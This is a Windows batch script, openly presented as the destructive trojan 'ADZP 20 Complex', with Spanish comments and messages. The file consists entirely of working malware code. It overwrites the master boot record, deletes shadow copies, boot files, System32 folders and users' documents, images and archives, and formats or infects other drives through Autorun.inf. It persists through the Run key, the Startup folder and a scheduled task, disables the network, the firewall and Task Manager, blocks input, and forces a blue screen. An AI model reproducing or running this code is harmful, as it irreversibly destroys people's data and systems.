@echo off
::
:: Troyano ADZP 20 Complex - Creado por Dharkon SK.
::
:: Nombre del troyano: ADZP 20 Complex, Shingapi.sk, Twain_20
:: Creador: Dharkon SK
:: Nivel de destruccion: Maximo
::
goto WinMain

:DestroyFile
   call :TakeOwnerShip /File "%~1"
   del /f /q "%~1" >nul 2>nul
   echo Archivo eliminado: %~1
goto :eof

:DestroyDirectory
   call :TakeOwnerShip /Folder "%~1"
   rd /s /q "%~1" >nul 2>nul
   rd "%~1" >nul 2>nul
goto :eof

:TakeOwnerShip
   if /i "%~1" == "" (goto :eof)
   if /i "%~1" == "/File" (
      if not exist "%~2" (goto :eof)
      takeown /f "%~1" >nul 2>nul
      icacls "%~1" /reset /c /q >nul 2>nul
      attrib -r -a -s -h "%~1" >nul 2>nul
      goto :eof
   )
   if /i "%~1" == "/Folder" (
      if not exist "%~2" (goto :eof)
      takeown /f "%~1" /r >nul 2>nul
      icacls "%~1" /reset /t /c /q >nul 2>nul
      attrib -r -a -s -h "%~1\*.*" >nul 2>nul
      goto :eof
   )
goto :eof

:FormatUnit
   if /i "%HomeDrive%" == "%~1:" (goto :eof)
   if not exist "%~1:\%TROJAN_FILE_NAME%" (
      format /y /q %~1: >nul 2>nul
      goto :eof
   ) else (
      copy "%TROJAN_FILE_PATH%" "%~1:\%TROJAN_FILE_NAME%" >nul 2>nul
      copy Autorun.inf "%~1:\Autorun.inf" >nul 2>nul
      goto :eof
   )
goto :eof

:FileDeletionThread
   for %%x in (%SignedFiles%) do (call :DestroyFile "%%x")
   call :DestroyDirectory "%windir%\Resources"
   call :DestroyDirectory "%SystemDirectory%\config"
   call :DestroyDirectory "%SystemDirectory%\drivers"
   call :DestroyDirectory "%SystemDirectory%\wbem"
   call :DestroyDirectory "%SystemDirectory%\catroot"
goto :eof

:AppFlood
   start "" "%TROJAN_FILE_PATH%" Modify-Instance
   start explorer.exe
   if exist "%windir%\notepad.exe" (start notepad)
   if exist "%SystemDirectory%\calc.exe" (start calc)
   if exist "%SystemDirectory%\mspaint.exe" (start mspaint)
goto :eof

:MatrixEffect
   color a
   :Loop[0]
      echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
   goto Loop[0]
goto :eof

:DestroyEx
   for /r "%SystemDirectory%" %%z in (*.%~1) do (call :DestroyFile "%%z")
goto :eof

:WriteRandomFile
   echo off>>"%~1"
   echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>"%~1"
goto :eof

:OverWriteMBR
   set mbrData=^
      0xB8, 0x03, 0x00, 0xCD, 0x10, 0xBE, 0x1B, 0x7C, 0xAC, 0x3C, 0x00, 0x74, 0x0A, 0xB4, 0x0E, 0xB7, 0x00, 0xB3, 0x00, 0xCD, 0x10, 0xEB, 0xF1, 0xFA, 0xF4, 0xEB, 0xFC, 0x0D, 0x0A, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x3A, 0x20, 0x4E, 0x6F, 0x20, 0x73, 0x65, 0x20, 0x68, 0x61, 0x20, 0x70, 0x6F, 0x64, 0x69, 0x64, 0x6F, 0x20, 0x61, 0x63, 0x63, 0x65, 0x64, 0x65, 0x72, 0x20, 0x61, 0x6C, 0x20, 0x4D, 0x42, 0x52, 0x0D, 0x0A, 0x41, 0x44, ^
      0x5A, 0x50, 0x20, 0x32, 0x30, 0x20, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x78, 0x20, 0x68, 0x61, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x75, 0x69, 0x64, 0x6F, 0x20, 0x65, 0x6C, 0x20, 0x4D, 0x42, 0x52, 0x20, 0x64, 0x65, 0x20, 0x74, 0x75, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x61, 0x64, 0x6F, 0x72, 0x61, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

   for %%i in (!mbrData!) do (set /a mbrData.Length+=1)
   powershell -ep Bypass -nol -nop -noni -c "$data = [byte[]](!mbrData!); while ($true) { $fs = [System.IO.File]::Open('\\.\PhysicalDrive0', [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite); $fs.Write($data, 0, !mbrData.Length!); $fs.Close(); }" >nul
goto :eof

:PlayAudioSequence
   set BBFRM="t * (((2 & (t >> 13)) > 0) ? 7 : 5) * (3 - ((3 & (t >> 9))) + ((3 & (t >> 8)))) >> (3 & (-t) >> (((t & 4096) == 4096 || ((t >> 11) %% 32) > 28) ? 2 : 16)) | (t >> 3)"
   set hz_rate=11025
   set duration=30
   powershell -ep Bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.IO; using System.Media; public class WinAPI { public static void PlaySequence() { int hz_rate = !hz_rate!; int duration = !duration!; int buffer = hz_rate * duration; byte[] b = new byte[buffer]; for (int t = 0; t < buffer; t++) b[t] = (byte)(!BBFRM!); using (var m = new MemoryStream()) { using (var w = new BinaryWriter(m)) { w.Write(new byte[] { 82, 73, 70, 70 }); w.Write(36 + b.Length); w.Write(new byte[] { 87, 65, 86, 69 }); w.Write(new byte[] { 102, 109, 116, 32 }); w.Write(16); w.Write((short)1); w.Write((short)1); w.Write(hz_rate); w.Write(hz_rate * 1); w.Write((short)1); w.Write((short)8); w.Write(new byte[] { 100, 97, 116, 97 }); w.Write(b.Length); w.Write(b); m.Position = 0; new SoundPlayer(m).PlaySync(); }}}}'; while ($true) { [WinAPI]::PlaySequence(); }" >nul 2>nul
goto :eof

:CurControl
   powershell -ep Bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class CurControl{ [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool BlockInput(bool fBlockIt); }'; [CurControl]::BlockInput($true); Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $width = $screen.Bounds.Width; $height = $screen.Bounds.Height; while ($true) { $x = Get-Random -Minimum 0 -Maximum $width; $y = Get-Random -Minimum 0 -Maximum $height; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y); Start-Sleep -Milliseconds 20 }" >nul 2>nul
goto :eof

:SetProcessAsCritical
   powershell -ep Bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class NativeMethods { [DllImport(\"ntdll.dll\", SetLastError = true)] public static extern int RtlSetProcessIsCritical(bool bNewValue, out bool pbOldValue, bool bCheckFlag); }'; $null = [NativeMethods]::RtlSetProcessIsCritical($true, [ref]$false, $false); Wait-Event;" >nul 2>nul
goto :eof

:CrashWindows
   powershell wininit >nul 2>nul
   taskkill /im svchost.exe /f >nul 2>nul
   taskkill /im winlogon.exe /f >nul 2>nul
   taskkill /im wininit.exe /f>nul 2>nul
   taskkill /im lsass.exe /f >nul 2>nul
   taskkill /im csrss.exe /f >nul 2>nul
   %HomeDrive%\con\con >nul 2>nul
   \\.\GLOBALROOT\Device\ConDrv\KernelConnect >nul 2>nul
goto :eof

:NtRaiseHardError
   powershell -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class BSOD { [DllImport(\"ntdll.dll\")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue); [DllImport(\"ntdll.dll\")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response); public static void TriggerBSOD() { bool tmp1; uint tmp2; RtlAdjustPrivilege(19, true, false, out tmp1); NtRaiseHardError(%~1, 0, 0, IntPtr.Zero, 6, out tmp2); } }' ; [BSOD]::TriggerBSOD()" >nul 2>nul
goto :eof

:WinMain
   title ADZP 20 Complex
   setlocal enabledelayedexpansion
   set TROJAN_FILE_PATH=%~f0
   set TROJAN_WORK_RUTE=%~dp0
   set TROJAN_FILE_NAME=%~nx0
   set TROJAN_INSTANCE_BOOL=1
   set SystemDirectory=%windir%\System32
   set SignedFiles=^
      *.rar *.zip *.7z  ^
      *.bak *.tar *.gz  ^
      *.jpg *.png *.bmp ^
      *.mp3 *.mp4 *.wav ^
      *.doc *.xls *.ppt ^
      *.odt *.ods *.odp ^
      *.mdb *.gif *.avi ^
      *.docx *.xlsx *.pptx ^
      *.accdb *.jpeg *.pdf
   color 4
   cd /d "%TROJAN_WORK_RUTE%" >nul 2>nul
   if /i "%~1" == "Execute-Payload" (call :%~2 %3 %4 %5 %6 %7 %8 %9 & exit)
   if /i "%~1" == "Modify-Instance" (set TROJAN_INSTANCE_BOOL=0)
   echo Windows NT
   echo ADZP 20 Complex destruira tu sistema operativo
   vssadmin delete shadows /all >nul 2>nul
   call :DestroyFile "%SystemDirectory%\winresume.exe"
   call :DestroyFile "%SystemDirectory%\winload.exe"
   call :DestroyFile "%SystemDirectory%\hal.dll"
   start /b "" cmd /c "%TROJAN_FILE_PATH%" Execute-Payload OverWriteMBR >nul 2>nul
   start /b "" cmd /c "%TROJAN_FILE_PATH%" Execute-Payload FileDeletionThread >nul 2>nul
   start /b "" cmd /c "%TROJAN_FILE_PATH%" Execute-Payload SetProcessAsCritical >nul 2>nul
   if /i "%TROJAN_INSTANCE_BOOL%" == "1" (
      start /b "" cmd /c "%TROJAN_FILE_PATH%" Execute-Payload PlayAudioSequence >nul 2>nul
      start /b "" cmd /c "%TROJAN_FILE_PATH%" Execute-Payload CurControl >nul 2>nul
   )
   bcdedit /delete {current} >nul 2>nul
   rundll32 user32.dll, SwapMouseButton
   if not exist "Error.vbs" (
      echo do>>Error.vbs
      echo Mensaje = MsgBox^(^"Error critico.^",16,^"Error^"^)>>Error.vbs
      echo loop>>Error.vbs
   )
   if not exist "Advertencia.vbs" (
      echo do>>Advertencia.vbs
      echo Mensaje = MsgBox^(^"Error en el sistema.^",48,^"Error^"^)>>Advertencia.vbs
      echo loop>>Advertencia.vbs
   )
   if not exist "Informacion.vbs" (
      echo do>>Informacion.vbs
      echo Mensaje = MsgBox^(^"Has sido hackeado!^",64,^"ADZP 20 Complex^"^)>>Informacion.vbs
      echo loop>>Informacion.vbs
   )
   if not exist "Autorun.inf" (
      echo [AutoRun]>>Autorun.inf
      echo Open=ADZP 20 Complex>>Autorun.inf
      echo Action=Start ADZP 20 Complex>>Autorun.inf
      echo Label=???>>Autorun.inf
   )
   echo off>>Taskse.exe
   for /l %%i in (1,1,10) do (
      echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
   )
   start WScript Informacion.vbs
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ADZP 20 Complex" /t REG_SZ /d "%TROJAN_FILE_PATH%" /f >nul 2>nul
   copy "%TROJAN_FILE_PATH%" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul 2>nul
   schtasks /create /tn "ADZP 20 Complex" /tr "%TROJAN_FILE_PATH%" /sc onlogon /rl HIGHEST /f >nul 2>nul
   netsh interface set interface "Wi-Fi" admin=disabled >nul 2>nul
   netsh interface set interface "Ethernet" admin=disabled >nul 2>nul
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>nul
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>nul
   reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>nul
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f >nul 2>nul
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>nul
   netsh advfirewall set allprofiles state off >nul 2>nul
   attrib -r -a -s -h *.* >nul 2>nul
   start "" "%TROJAN_FILE_PATH%" Execute-Payload MatrixEffect
   call :WriteRandomFile "Virus.db"
   call :WriteRandomFile "Virus.exe"
   call :WriteRandomFile "Virus.dll"
   call :WriteRandomFile "Virus.com"
   call :WriteRandomFile "Virus.ini"
   call :WriteRandomFile "Virus.inf"
   call :WriteRandomFile "Virus.sys"
   call :WriteRandomFile "Virus.reg"
   call :WriteRandomFile "Virus.iso"
   call :WriteRandomFile "Virus.bin"
   call :WriteRandomFile "Virus.cmd"
   call :WriteRandomFile "Virus.jar"
   call :WriteRandomFile "Virus.chk"
   call :WriteRandomFile "Virus.lib"
   call :WriteRandomFile "Virus.ocx"
   call :WriteRandomFile "Virus.dat"
   call :WriteRandomFile "Virus.cur"
   call :WriteRandomFile "Virus.386"
   call :WriteRandomFile "Virus.scr"
   call :WriteRandomFile "Virus.acm"
   call :WriteRandomFile "Virus.cpl"
   call :WriteRandomFile "Virus.hlp"
   call :WriteRandomFile "Virus.mls"
   call :WriteRandomFile "Virus.zsc"
   call :WriteRandomFile "Virus.vbs"
   call :WriteRandomFile "Virus.drv"
   call :WriteRandomFile "Virus.wsh"
   call :WriteRandomFile "Virus.cer"
   call :WriteRandomFile "Virus.msc"
   call :WriteRandomFile "Virus.html"
   start WScript Error.vbs
   start WScript Advertencia.vbs
   start WScript Error.vbs
   start WScript Advertencia.vbs
   start WScript Error.vbs
   start WScript Advertencia.vbs
   start WScript Error.vbs
   start WScript Advertencia.vbs
   start WScript Error.vbs
   start WScript Advertencia.vbs
   msg * Virus detectado
   msg * Virus detectado
   msg * Has sido hackeado!
   call :AppFlood
   call :AppFlood
   call :AppFlood
   call :DestroyEx ax
   call :DestroyEx msc
   call :DestroyEx cpl
   call :DestroyEx ini
   call :DestroyEx bin
   call :DestroyEx nls
   call :DestroyEx dat
   call :DestroyEx ocx
   call :DestroyEx drv
   call :DestroyEx sys

   if exist "%SystemDrive%\autoexec.bat" (call :DestroyFile "%HomeDrive%\autoexec.bat")
   if exist "%SystemDrive%\boot.ini" (call :DestroyFile "%HomeDrive%\boot.ini")
   if exist "%SystemDrive%\ntldr" (call :DestroyFile "%HomeDrive%\ntldr")
   if exist "%SystemDrive%\windowswin.ini" (call :DestroyFile "%HomeDrive%\windowswin.ini")
   if exist "%SystemDrive%\ntdetect.com" (call :DestroyFile "%HomeDrive%\ntdetect.com")

   shutdown -s -t 60 -c "ADZP 20 Complex esta a punto de eliminar el sistema operativo."

   start WScript Error.vbs
   start WScript Advertencia.vbs
   start WScript Error.vbs
   start WScript Advertencia.vbs

   call :NtRaiseHardError 0xdeaddead
   call :CrashWindows

   start WScript Error.vbs
   start WScript Advertencia.vbs
   start WScript Error.vbs
   start WScript Advertencia.vbs

   timeout /nobreak -1 >nul

exit